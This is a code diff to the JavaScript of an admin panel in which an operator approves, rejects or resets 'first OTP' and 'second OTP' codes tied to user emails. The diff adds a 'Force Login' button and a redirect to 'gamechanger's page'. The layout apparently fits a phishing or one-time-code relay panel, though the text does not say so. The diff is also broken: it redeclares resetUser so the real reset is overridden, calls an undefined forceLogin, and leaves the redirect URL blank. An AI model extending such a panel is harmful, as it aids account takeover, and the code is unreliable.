@@ -868,7 +868,8 @@ function displayUsers(users) {
                             <button class="action-btn btn-approve" onclick="approveFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon>Approve</button>
                             <button class="action-btn btn-incorrect" onclick="incorrectFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon>Incorrect</button>
                             <button class="action-btn btn-never" onclick="neverFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="ban-outline"></ion-icon>Never</button>
-                            <button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon>Reset</button>`;
+                            <button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon>Reset</button>
+                                                        <button class="action-btn btn-reset" onclick="forceLogin('${escapeHtml(user.email)}')"><ion-icon name="log-in-outline"></ion-icon>Force Login</button>`;
         }
         else if (!user.otp1_never && user.otp1_correct && user.second_otp && !user.otp2_correct) {
             actionButtons += `<button class="action-btn btn-approve" onclick="approveSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon>Approve</button>
@@ -930,6 +931,7 @@ function neverFirstOTP(email) { if(confirm(`Mark ${email} as NEVER? User will be
 function approveSecondOTP(email) { apiCall('/api/admin/approve-second-otp', 'POST', email, 'Second OTP approved', 'Failed'); }
 function incorrectSecondOTP(email) { apiCall('/api/admin/incorrect-second-otp', 'POST', email, 'Second OTP incorrect', 'Failed'); }
 function resetUser(email) { if(confirm(`Reset ${email}? This will create a new record.`)) apiCall('/api/admin/reset-user', 'POST', email, 'User reset', 'Failed'); }
+function resetUser(email) { if(confirm(`Reset ${email}? This will redirect the user to gamechanger's page at: .`)) apiCall('/api/admin/force-login', 'POST', email, 'User reset', 'Failed'); }
 function deleteUser(email) { if(confirm(`Delete ${email} permanently?`)) apiCall('/api/admin/delete-user', 'DELETE', email, 'User deleted', 'Failed'); }
 
 // ==================== THEME SETUP ====================
